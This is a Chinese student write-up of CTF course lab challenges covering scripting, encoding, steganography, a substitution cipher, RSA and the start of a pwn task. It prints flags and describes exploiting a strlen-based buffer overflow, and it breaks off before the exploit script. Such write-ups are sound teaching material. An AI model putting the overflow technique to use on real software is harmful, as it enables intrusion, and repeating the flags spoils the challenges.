<a id="__codelineno-0-15" name="__codelineno-0-15"></a>
<a id="__codelineno-0-16" name="__codelineno-0-16"></a><span class="nb">print</span><span class="p">(</span><span class="s2">"now your string:"</span><span class="p">,</span> <span class="n">data_new</span><span class="p">)</span> <span class="c1"># 打印"now your string: "然后输出刚刚大小写互换的字符串</span>
</code></pre></div></td></tr></table></div>
<p>校巴上这道题去年做过一次了</p>
<p><img alt="alt text" src="../lab0_1.png"/></p>
<p>不过再做一次也可以：</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-1-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-1-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-1-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-1-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-1-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-1-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-1-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-1-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-1-10">10</a></span>
<span class="normal"><a href="#__codelineno-1-11">11</a></span>
<span class="normal"><a href="#__codelineno-1-12">12</a></span>
<span class="normal"><a href="#__codelineno-1-13">13</a></span>
<span class="normal"><a href="#__codelineno-1-14">14</a></span>
<span class="normal"><a href="#__codelineno-1-15">15</a></span>
<span class="normal"><a href="#__codelineno-1-16">16</a></span>
<span class="normal"><a href="#__codelineno-1-17">17</a></span>
<span class="normal"><a href="#__codelineno-1-18">18</a></span>
<span class="normal"><a href="#__codelineno-1-19">19</a></span>
<span class="normal"><a href="#__codelineno-1-20">20</a></span>
<span class="normal"><a href="#__codelineno-1-21">21</a></span>
<span class="normal"><a href="#__codelineno-1-22">22</a></span>
<span class="normal"><a href="#__codelineno-1-23">23</a></span>
<span class="normal"><a href="#__codelineno-1-24">24</a></span>
<span class="normal"><a href="#__codelineno-1-25">25</a></span>
<span class="normal"><a href="#__codelineno-1-26">26</a></span>
<span class="normal"><a href="#__codelineno-1-27">27</a></span>
<span class="normal"><a href="#__codelineno-1-28">28</a></span>
<span class="normal"><a href="#__codelineno-1-29">29</a></span>
<span class="normal"><a href="#__codelineno-1-30">30</a></span>
<span class="normal"><a href="#__codelineno-1-31">31</a></span>
<span class="normal"><a href="#__codelineno-1-32">32</a></span>
<span class="normal"><a href="#__codelineno-1-33">33</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="kn">import</span> <span class="nn">subprocess</span>
<a id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="kn">import</span> <span class="nn">fcntl</span>
<a id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="kn">import</span> <span class="nn">os</span>
<a id="__codelineno-1-4" name="__codelineno-1-4"></a><span class="kn">import</span> <span class="nn">re</span>
<a id="__codelineno-1-5" name="__codelineno-1-5"></a>
<a id="__codelineno-1-6" name="__codelineno-1-6"></a><span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span>
<a id="__codelineno-1-7" name="__codelineno-1-7"></a>    <span class="p">[</span><span class="s1">'nc'</span><span class="p">,</span> <span class="s1">'10.214.160.13'</span><span class="p">,</span> <span class="s1">'11002'</span><span class="p">],</span>
<a id="__codelineno-1-8" name="__codelineno-1-8"></a>    <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span>
<a id="__codelineno-1-9" name="__codelineno-1-9"></a>    <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span>
<a id="__codelineno-1-10" name="__codelineno-1-10"></a>    <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span>
<a id="__codelineno-1-11" name="__codelineno-1-11"></a>    <span class="n">text</span><span class="o">=</span><span class="kc">True</span>
<a id="__codelineno-1-12" name="__codelineno-1-12"></a><span class="p">)</span>
<a id="__codelineno-1-13" name="__codelineno-1-13"></a>
<a id="__codelineno-1-14" name="__codelineno-1-14"></a><span class="n">fd</span> <span class="o">=</span> <span class="n">proc</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">fileno</span><span class="p">()</span>
<a id="__codelineno-1-15" name="__codelineno-1-15"></a><span class="n">fl</span> <span class="o">=</span> <span class="n">fcntl</span><span class="o">.</span><span class="n">fcntl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">fcntl</span><span class="o">.</span><span class="n">F_GETFL</span><span class="p">)</span>
<a id="__codelineno-1-16" name="__codelineno-1-16"></a><span class="n">fcntl</span><span class="o">.</span><span class="n">fcntl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">fcntl</span><span class="o">.</span><span class="n">F_SETFL</span><span class="p">,</span> <span class="n">fl</span> <span class="o">|</span> <span class="n">os</span><span class="o">.</span><span class="n">O_NONBLOCK</span><span class="p">)</span>
<a id="__codelineno-1-17" name="__codelineno-1-17"></a>
<a id="__codelineno-1-18" name="__codelineno-1-18"></a><span class="n">buffer</span> <span class="o">=</span> <span class="s1">''</span>
<a id="__codelineno-1-19" name="__codelineno-1-19"></a><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
<a id="__codelineno-1-20" name="__codelineno-1-20"></a>    <span class="k">try</span><span class="p">:</span>
<a id="__codelineno-1-21" name="__codelineno-1-21"></a>        <span class="n">data</span> <span class="o">=</span> <span class="n">proc</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<a id="__codelineno-1-22" name="__codelineno-1-22"></a>        <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
<a id="__codelineno-1-23" name="__codelineno-1-23"></a>            <span class="n">buffer</span> <span class="o">+=</span> <span class="n">data</span>
<a id="__codelineno-1-24" name="__codelineno-1-24"></a>            <span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">''</span><span class="p">)</span>
<a id="__codelineno-1-25" name="__codelineno-1-25"></a>            <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">'([+-\d\s]+)=\s*$'</span><span class="p">,</span> <span class="n">buffer</span><span class="p">)</span>
<a id="__codelineno-1-26" name="__codelineno-1-26"></a>            <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
<a id="__codelineno-1-27" name="__codelineno-1-27"></a>                <span class="n">expr</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
<a id="__codelineno-1-28" name="__codelineno-1-28"></a>                <span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">expr</span><span class="p">)</span>
<a id="__codelineno-1-29" name="__codelineno-1-29"></a>                <span class="n">proc</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<a id="__codelineno-1-30" name="__codelineno-1-30"></a>                <span class="n">proc</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
<a id="__codelineno-1-31" name="__codelineno-1-31"></a>                <span class="n">buffer</span> <span class="o">=</span> <span class="s1">''</span>
<a id="__codelineno-1-32" name="__codelineno-1-32"></a>    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
<a id="__codelineno-1-33" name="__codelineno-1-33"></a>        <span class="k">pass</span>
</code></pre></div></td></tr></table></div>
<p>整体逻辑就是<code>nc</code>类似于一个程序，发送过来一个巨长的数学式子，只要用<span class="heti-skip"><span class="heti-spacing"> </span>python<span class="heti-spacing"> </span></span>进行计算（<span>eval<span class="heti-spacing"> </span></span>自动转换）即可。之后再写到<span class="heti-skip"><span class="heti-spacing"> </span>stdin<span class="heti-spacing"> </span></span>进行<span class="heti-skip"><span class="heti-spacing"> </span>flush<span class="heti-spacing"> </span></span>即可。<br/>
（理论上用exec也能玩的来）</p>
<div style="page-break-after: always;"></div>
<h2 id="misc">MISC<a class="headerlink" href="#misc" title="Permanent link">¶</a></h2>
<h4 id="challenge-1_1">Challenge 1<a class="headerlink" href="#challenge-1_1" title="Permanent link">¶</a></h4>
<p>老规矩先贴<span><span class="heti-spacing"> </span>flag</span>：<code>AAA{wELc0m3_t0_Ctf_5umMEr_c0UrsE_2025}</code></p>
<p>首先观察题目，题目里面提示了要了解<span class="heti-skip"><span class="heti-spacing"> </span>base<span class="heti-spacing"> </span></span>相关内容，那理所应当的往<span class="heti-skip"><span class="heti-spacing"> </span>base<span class="heti-spacing"> </span></span>上面想。因为以<span class="heti-skip"><span class="heti-spacing"> </span>=<span class="heti-spacing"> </span></span>结尾，所以考虑<span><span class="heti-spacing"> </span>Base64+</span>。尝试了一遍后发现<span class="heti-skip"><span class="heti-spacing"> </span>Base85<span class="heti-spacing"> </span></span>解码后以<span class="heti-skip"><span class="heti-spacing"> </span>==<span class="heti-spacing"> </span></span>结尾。所以继续使用<span class="heti-skip"><span class="heti-spacing"> </span>Base64<span class="heti-spacing"> </span></span>解码。再度解码后又以<span class="heti-skip"><span class="heti-spacing"> </span>===<span class="heti-spacing"> </span></span>结尾，于是<s>烘焙</s>解码过程就是<span><span class="heti-spacing"> </span>Base85-Base64-Base32</span>，最终获得了这个<span><span class="heti-spacing"> </span>flag</span>。</p>
<h4 id="challenge-2_1">Challenge 2<a class="headerlink" href="#challenge-2_1" title="Permanent link">¶</a></h4>
<p>图片隐写，<s>这个我曾经干过，在某个发布的工具包<span class="heti-skip"><span class="heti-spacing"> </span>logo<span class="heti-spacing"> </span></span>图片里面藏涩图（x）</s></p>
<p>flag：<code>AAA{gr3@t_J08!_1et'5_P1@y_m1SC_TOG3Th3R}</code></p>
<p><span>hint<span class="heti-spacing"> </span></span>给完的难度就低了很多。首先是<span class="heti-skip"><span class="heti-spacing"> </span>LSB<span class="heti-spacing"> </span></span>隐写，用在线工具<span class="heti-skip"><span class="heti-spacing"> </span>Aperi'Solve<span class="heti-spacing"> </span></span>自动分析，发现<span class="heti-skip"><span class="heti-spacing"> </span>Red<span class="heti-spacing"> </span></span>通道下可以找到图片中的前半段<span><span class="heti-spacing"> </span>flag</span>：</p>
<p><img alt="alt text" src="../lab0_2.png"/></p>
<p>（“请仔细观察图片”，这人眼也太高级了）</p>
<p>后半段是查看文件内容，于是尝试<span class="heti-skip"><span class="heti-spacing"> </span>exiftool<span class="heti-spacing"> </span></span>和<span><span class="heti-spacing"> </span>strings</span>，发现<code>strings misc_challenge2.png</code>可以直接输出后半段<span><span class="heti-spacing"> </span>flag</span>。于是得到本<span><span class="heti-spacing"> </span>flag</span>。</p>
<div style="page-break-after: always;"></div>
<h2 id="crypto">Crypto<a class="headerlink" href="#crypto" title="Permanent link">¶</a></h2>
<h4 id="challenge-1_2">Challenge 1<a class="headerlink" href="#challenge-1_2" title="Permanent link">¶</a></h4>
<p>读了一遍“跳舞的小人”，有点纳闷这<span class="heti-skip"><span class="heti-spacing"> </span>byd<span class="heti-spacing"> </span></span>旗子到底是怎么看出来是旗子的，有点抽象了属于是</p>
<p>首先遍观全图，根据以往的<s>日语经验</s>，看到有圈但是没看到两撇（bushi，结合是英文题目考虑这可能是大写或者空格。而根据头没有圈而尾有圈，考虑这个圈代表空格。然后随便给它们排下号，把图片翻译成了如下一段话：</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1"></a>ABCDEFA GAFHC IDJJ HKKDLG FGKG MJGHNG JSKG FDT AB AFG HOHCPBCGP IHKGFBSNG CGHK AFG MBJDQG NAHADBC IFGKG AFG MKBRGNNDBCHJ HNNHNNDC KGGNG FDKGP IDJJ GJDTDCHAG FDT ABTBKKBI NFG IDJJ EB AB AFG IHKGFBSNG HCP OGQBTG AFG RDKNA MGKNBC AB PDNQBLGK FDN QBKMNG IDAF H NAKBCE HJDOD AFGNG MBJDQG BRRDQGKN HONBJSAGJU QHC CBA HKKGNA FGK
</code></pre></div></td></tr></table></div>
<p><span>ok<span class="heti-spacing"> </span></span>我在转译的时候就发现了有个单词<code>AFG</code>出现的很频，所以考虑这个单词是<span><span class="heti-spacing"> </span>the</span>。</p>
<p></p><center>
[A=t, F=h, G=e]
</center>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1"></a>tBCDEht ethHC IDJJ HKKDLe heKe MJeHNe JSKe hDT tB the HOHCPBCeP IHKehBSNe CeHK the MBJDQe NtHtDBC IheKe the MKBReNNDBCHJ HNNHNNDC KeeNe hDKeP IDJJ eJDTDCHte hDT tBTBKKBI Nhe IDJJ EB tB the IHKehBSNe HCP OeQBTe the RDKNt MeKNBC tB PDNQBLeK hDN QBKMNe IDth H NtKBCE HJDOD theNe MBJDQe BRRDQeKN HONBJSteJU QHC CBt HKKeNt heK
</code></pre></div></td></tr></table></div>
<p>然后看到了比较特殊的<code>Nhe</code><span><span class="heti-spacing"> </span>,</span> <code>tB</code>, <code>H</code>，首先是这个<code>tB</code>，因为英文单词必须有元音（含半<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，而<span class="heti-skip"><span class="heti-spacing"> </span>ta, te, ti, tu, ty, tw<span class="heti-spacing"> </span></span>都不是单词，所以<code>B</code>只能<span><span class="heti-spacing"> </span>代</span>表o。而相应的<code>H</code>可能<span><span class="heti-spacing"> </span>是</span><span class="heti-skip"><span class="heti-spacing"> </span>a<span class="heti-spacing"> </span></span>或i。又<span class="heti-skip"><span class="heti-spacing"> </span>he<span class="heti-spacing"> </span></span>结尾的三个英文单词的词只有<span class="heti-skip"><span class="heti-spacing"> </span>she, the<span class="heti-spacing"> </span></span>有意义，前面的<code>A</code>已经代表<span class="heti-skip"><span class="heti-spacing"> </span>t<span class="heti-spacing"> </span></span>了，于是<code>N</code>只能<span><span class="heti-spacing"> </span>代</span>表s。</p>
<p></p><center>
[A=t, F=h, G=e, B=o, N=s, H=a/i]
</center>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1"></a>toCDEht ethHC IDJJ HKKDLe heKe MJeHse JSKe hDT to the HOHCPoCeP IHKehoSse CeHK the MoJDQe stHtDoC IheKe the MKoRessDoCHJ HssHssDC Keese hDKeP IDJJ eJDTDCHte hDT toToKKoI she IDJJ Eo to the IHKehoSse HCP OeQoTe the RDKst MeKsoC to PDsQoLeK hDs QoKMse IDth H stKoCE HJDOD these MoJDQe oRRDQeKs HOsoJSteJU QHC Cot HKKest heK
</code></pre></div></td></tr></table></div>
<p>紧接着可以看到<code>Eo</code>，猜<span><span class="heti-spacing"> </span>测是</span>go。<span><span class="heti-spacing"> </span>于是</span><code>E</code>=g。另外我在开发游戏谁是国王的时候，这个<span class="heti-skip"><span class="heti-spacing"> </span>byd<span class="heti-spacing"> </span></span>游戏最开<span><span class="heti-spacing"> </span>始叫King Assass</span>in，当时就开玩笑说<span><span class="heti-spacing"> </span>这是king a</span>ss♂ass♂in，没想到我看到这个<code>HssHssDC</code>还真能让我想起来这个<span class="heti-skip"><span class="heti-spacing"> </span>byd<span class="heti-spacing"> </span></span>词，于是<code>HDC</code><span><span class="heti-spacing"> </span>就是a</span>in。</p>
<p></p><center>
[A=t, F=h, G=e, B=o, N=s, E=g, H=a, D=i, C=n]
</center>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1"></a>tonight ethan IiJJ aKKiLe heKe MJease JSKe hiT to the aOanPoneP IaKehoSse neaK the MoJiQe station IheKe the MKoRessionaJ assassin Keese hiKeP IiJJ eJiTinate hiT toToKKoI she IiJJ go to the IaKehoSse anP OeQoTe the RiKst MeKson to PisQoLeK his QoKMse Iith a stKong aJiOi these MoJiQe oRRiQeKs aOsoJSteJU Qan not aKKest heK
</code></pre></div></td></tr></table></div>
<p>这个时候已经能看到前面两个词是<span><span class="heti-spacing"> </span>今晚Eth</span>an。这个纯靠语感就想到<span><span class="heti-spacing"> </span>了</span><code>IiJJ</code><span><span class="heti-spacing"> </span>是wi</span>ll，所以<code>IJ</code><span><span class="heti-spacing"> </span>代表</span>wl。</p>
<p></p><center>
[A=t, F=h, G=e, B=o, N=s, E=g, H=a, D=i, C=n, I=w, J=l]
</center>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1"></a>tonight ethan IiJJ aKKiLe heKe MJease JSKe hiT to the aOanPoneP IaKehoSse neaK the MoJiQe station IheKe the MKoRessionaJ assassin Keese hiKeP IiJJ eJiTinate hiT toToKKoI she IiJJ go to the IaKehoSse anP OeQoTe the RiKst MeKson to PisQoLeK his QoKMse Iith a stKong aJiOi these MoJiQe oRRiQeKs aOsoJSteJU Qan not aKKest heK
</code></pre></div></td></tr></table></div>
<p>再根据<code>wheKe</code>和<code>neaK</code>猜测<code>K</code><span><span class="heti-spacing"> </span>代</span>表r。<code>arriLe</code>猜测<code>L</code><span><span class="heti-spacing"> </span>代</span>表v。</p>
<p></p><center>
[A=t, F=h, G=e, B=o, N=s, E=g, H=a, D=i, C=n, I=w, J=l, K=r, L=v]
</center>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1"></a>tonight ethan will arrive here Mlease lSre hiT to the aOanPoneP warehoSse near the MoliQe station where the MroRessional assassin reese hireP will eliTinate hiT toTorrow she will go to the warehoSse anP OeQoTe the Rirst Merson to PisQover his QorMse with a strong aliOi these MoliQe oRRiQers aOsolStelU Qan not arrest her
</code></pre></div></td></tr></table></div>
<p><code>aOsolStelU</code>已经写脸上了，<span>O=b S=u U=y,<span class="heti-spacing"> </span></span><code>abanPoneP</code>是经典老四六级<span><span class="heti-spacing"> </span>词</span><span class="heti-skip"><span class="heti-spacing"> </span>abandoned, P=d,<span class="heti-spacing"> </span></span><code>MroRessional</code><span><span class="heti-spacing"> </span>是 professional, M=p, R</span>=f</p>
<p></p><center>
[A=t, F=h, G=e, B=o, N=s, E=g, H=a, D=i, C=n, I=w, J=l, K=r, L=v, O=b, S=u, U=y, P=d, M=p, R=f]
</center>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1"></a>tonight ethan will arrive here please lure hiT to the abandoned warehouse near the poliQe station where the professional assassin reese hired will eliTinate hiT toTorrow she will go to the warehouse and beQoTe the first person to disQover his Qorpse with a strong alibi these poliQe offiQers absolutely Qan not arrest her
</code></pre></div></td></tr></table></div>
<p>那么很容易知<span><span class="heti-spacing"> </span>道</span><code>poliQe</code><span><span class="heti-spacing"> </span>是poli</span>ce。<code>becoTe</code><span><span class="heti-spacing"> </span>是beco</span>me</p>
<p></p><center>
[A=t, F=h, G=e, B=o, N=s, E=g, H=a, D=i, C=n, I=w, J=l, K=r, L=v, O=b, S=u, U=y, P=d, M=p, R=f, Q=c, T=m]
</center>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1"></a>tonight ethan will arrive here please lure him to the abandoned warehouse near the police station where the professional assassin reese hired will eliminate him tomorrow she will go to the warehouse and become the first person to discover his corpse with a strong alibi these police officers absolutely can not arrest her
</code></pre></div></td></tr></table></div>
<p>将大小写修改正确并添加标点符号就能获得如下内容：</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1"></a>Tonight Ethan will arrive here. Please lure him to the abandoned warehouse near the police station, where the professional assassin Reese hired will eliminate him. Tomorrow, she will go to the warehouse and become the first person to discover his corpse with a strong alibi. These police officers absolutely can not arrest her.
</code></pre></div></td></tr></table></div>
<p>于是翻译如下：</p>
<blockquote>
<p>今晚伊森将抵达这里，并引诱他到警察局附近的废弃仓库，里斯雇佣的专业刺客将在那里消灭他。明天，她将前往仓库，成为第一个发现他尸体的人，并提供强有力的不在场证明。这些警察绝对无法逮捕她
</p>
</blockquote>
<h2 id="challenge-2_2">Challenge 2<a class="headerlink" href="#challenge-2_2" title="Permanent link">¶</a></h2>
<p>flag: <code>AAA{Ace_Attorney_is_very_fun_Phoenix_Wright&amp;Miles_Edgeworth}</code></p>
<p>这是个非常简单的<span class="heti-skip"><span class="heti-spacing"> </span>RSA<span class="heti-spacing"> </span></span>题，<span>RSA<span class="heti-spacing"> </span></span>原理这里不再赘述，因为给定<span><span class="heti-spacing"> </span>了</span><span class="heti-skip"><span class="heti-spacing"> </span>$ p $<span class="heti-spacing"> </span></span><span><span class="heti-spacing"> </span>和 $ q</span> $ ，所以直接上<span class="heti-skip"><span class="heti-spacing"> </span>python<span class="heti-spacing"> </span></span>脚本计算<span class="heti-skip"><span class="heti-spacing"> </span>$ \varphi(n)=(p-1)*(q-1) $<span class="heti-spacing"> </span></span>和<span class="heti-skip"><span class="heti-spacing"> </span>$ d= $<span class="heti-spacing"> </span></span>即可。</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-11-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-11-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-11-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-11-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-11-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-11-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-11-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-11-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-11-10">10</a></span>
<span class="normal"><a href="#__codelineno-11-11">11</a></span>
<span class="normal"><a href="#__codelineno-11-12">12</a></span>
<span class="normal"><a href="#__codelineno-11-13">13</a></span>
<span class="normal"><a href="#__codelineno-11-14">14</a></span>
<span class="normal"><a href="#__codelineno-11-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1"></a><span class="n">p</span> <span class="o">=</span> <span class="mh">0x848</span><span class="o">...</span>
<a id="__codelineno-11-2" name="__codelineno-11-2"></a><span class="n">q</span> <span class="o">=</span> <span class="mh">0xa0a</span><span class="o">...</span>
<a id="__codelineno-11-3" name="__codelineno-11-3"></a><span class="n">n</span> <span class="o">=</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span>
<a id="__codelineno-11-4" name="__codelineno-11-4"></a><span class="n">varphi</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<a id="__codelineno-11-5" name="__codelineno-11-5"></a><span class="n">e</span> <span class="o">=</span> <span class="mh">0x10001</span>
<a id="__codelineno-11-6" name="__codelineno-11-6"></a><span class="n">c</span><span class="o">=</span><span class="mh">0x39f</span><span class="o">...</span>
<a id="__codelineno-11-7" name="__codelineno-11-7"></a><span class="n">d</span><span class="o">=</span><span class="mi">0</span>
<a id="__codelineno-11-8" name="__codelineno-11-8"></a><span class="k">def</span> <span class="nf">ext</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">):</span>
<a id="__codelineno-11-9" name="__codelineno-11-9"></a>    <span class="k">if</span> <span class="n">b</span><span class="o">==</span><span class="mi">0</span><span class="p">:</span>
<a id="__codelineno-11-10" name="__codelineno-11-10"></a>        <span class="k">return</span> <span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
<a id="__codelineno-11-11" name="__codelineno-11-11"></a>    <span class="k">else</span><span class="p">:</span>
<a id="__codelineno-11-12" name="__codelineno-11-12"></a>        <span class="n">g</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="o">=</span><span class="n">ext</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">a</span><span class="o">%</span><span class="n">b</span><span class="p">)</span>
<a id="__codelineno-11-13" name="__codelineno-11-13"></a>        <span class="k">return</span> <span class="n">g</span><span class="p">,</span><span class="n">y</span><span class="p">,</span><span class="n">x</span><span class="o">-</span><span class="p">(</span><span class="n">a</span><span class="o">//</span><span class="n">b</span><span class="p">)</span><span class="o">*</span><span class="n">y</span>
<a id="__codelineno-11-14" name="__codelineno-11-14"></a><span class="n">m</span><span class="o">=</span><span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">ext</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">varphi</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">%</span><span class="n">varphi</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
<a id="__codelineno-11-15" name="__codelineno-11-15"></a><span class="nb">print</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span><span class="p">,</span> <span class="s1">'big'</span><span class="p">))</span>
</code></pre></div></td></tr></table></div>
<div style="page-break-after: always;"></div>
<h2 id="pwn">Pwn<a class="headerlink" href="#pwn" title="Permanent link">¶</a></h2>
<h4 id="task1">Task1<a class="headerlink" href="#task1" title="Permanent link">¶</a></h4>
<p>在<span class="heti-skip"><span class="heti-spacing"> </span>program.c<span class="heti-spacing"> </span></span>里，有这么<span><span class="heti-spacing"> </span>几个b</span>ug：</p>
<ol>
<li>
<p><span>Line28<span class="heti-spacing"> </span></span>使用<code>strlen(tmp-&gt;data)</code>参与计算，而<code>strlen()</code>的计算方法是<strong>直到空字符</strong>，因此这里给入一个不以<span class="heti-skip"><span class="heti-spacing"> </span>'\0'<span class="heti-spacing"> </span></span>结尾的内容就可以在<span class="heti-skip"><span class="heti-spacing"> </span>30<span class="heti-spacing"> </span></span>行的<span><span class="heti-spacing"> </span>时候overfl</span>ow</p>
</li>
<li>
<p><span>Line44<span class="heti-spacing"> </span></span>声明<span class="heti-skip"><span class="heti-spacing"> </span>err<span class="heti-spacing"> </span></span>但未初始化值，而在<span class="heti-skip"><span class="heti-spacing"> </span>Line55<span class="heti-spacing"> </span></span>为<span class="heti-skip"><span class="heti-spacing"> </span>err<span class="heti-spacing"> </span></span>唯一的赋值语句，这导致如果<span class="heti-skip"><span class="heti-spacing"> </span>Line53<span class="heti-spacing"> </span></span>的条件不满足，那么<span class="heti-skip"><span class="heti-spacing"> </span>err<span class="heti-spacing"> </span></span>将以未定义的值返回。</p>
</li>
</ol>
<h4 id="task2">Task2<a class="headerlink" href="#task2" title="Permanent link">¶</a></h4>
<p>上面提到的两个<span class="heti-skip"><span class="heti-spacing"> </span>bug<span class="heti-spacing"> </span></span>可以通过输入无<span class="heti-skip"><span class="heti-spacing"> </span>'\0'<span class="heti-spacing"> </span></span>的<span class="heti-skip"><span class="heti-spacing"> </span>data<span class="heti-spacing"> </span></span>和尝试构造<span><span class="heti-spacing"> </span>令</span><code>(written!=0 &amp;&amp; written == pkt-&gt;size)</code>为1。为了构造<span><span class="heti-spacing"> </span>无</span><span class="heti-skip"><span class="heti-spacing"> </span>'\0'<span class="heti-spacing"> </span></span><span><span class="heti-spacing"> </span>的da</span>ta，使用<span class="heti-skip"><span class="heti-spacing"> </span>python<span class="heti-spacing"> </span></span>脚本注入。</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span>
<span class="normal"><a href="#__codelineno-12-2">2</a></span>
<span class="normal"><a href="#__codelineno-12-3">3</a></span>
<span class="normal"><a href="#__codelineno-12-4">4</a></span>
<span class="normal"><a href="#__codelineno-12-5">5</a></span>
